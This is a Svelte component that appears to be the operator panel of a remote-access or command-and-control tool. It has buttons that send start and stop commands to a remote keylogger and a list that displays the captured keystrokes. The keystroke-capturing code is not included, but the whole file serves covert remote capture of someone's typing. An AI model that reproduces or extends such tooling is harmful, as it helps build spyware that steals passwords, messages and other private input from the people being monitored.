<script lang="ts">
	import { writable } from 'svelte/store';
	export let sendMessage: (type: string, data: string) => void;
	export let keylogs: import('svelte/store').Writable<string[]>;
	const keyloggerRunning = writable(false);

	let displayLimit = writable('100');
	const limitOptions = ['10', '25', '50', '100', 'all'];

	$: displayedKeylogs = $displayLimit === 'all' ? $keylogs : $keylogs.slice(-parseInt($displayLimit));

	function startKeylogger() {
		sendMessage('keylogger_command', 'start');
		keyloggerRunning.set(true);
	}

	function stopKeylogger() {
		sendMessage('keylogger_command', 'stop');
		keyloggerRunning.set(false);
	}
</script>

<div class="mt-6 p-4 bg-gray-700 rounded space-y-4">
	<div class="flex justify-between items-center">
		<h3 class="text-2xl font-semibold text-white">Keystrokes</h3>
		<div class="flex items-center gap-2">
			<label for="keylog-limit" class="text-sm text-gray-300">Show last:</label>
			<select
				id="keylog-limit"
				bind:value={$displayLimit}
				class="bg-gray-800 text-white border border-gray-600 rounded px-2 py-1 focus:outline-none focus:ring focus:border-blue-400"
			>
				{#each limitOptions as option}
					<option value={option}>{option === 'all' ? 'All' : option}</option>
				{/each}
			</select>
            {#if !$keyloggerRunning}
				<button
					on:click={startKeylogger}
					class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded transition"
				>
					Start Keylogger
				</button>
			{:else}
				<button
					on:click={stopKeylogger}
					class="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded transition"
				>
					Stop Keylogger
				</button>
			{/if}
		</div>
	</div>
	<div class="bg-gray-900 p-4 rounded max-h-64 overflow-y-auto">
		{#if displayedKeylogs.length > 0}
			<div class="flex flex-wrap gap-2">
				{#each displayedKeylogs as key}
					<span class="inline-block px-2 py-1 bg-blue-600 text-white text-sm rounded">
						{key}
					</span>
				{/each}
			</div>
		{:else}
			<p class="text-gray-400 text-sm">No keystrokes recorded.</p>
		{/if}
	</div>
</div>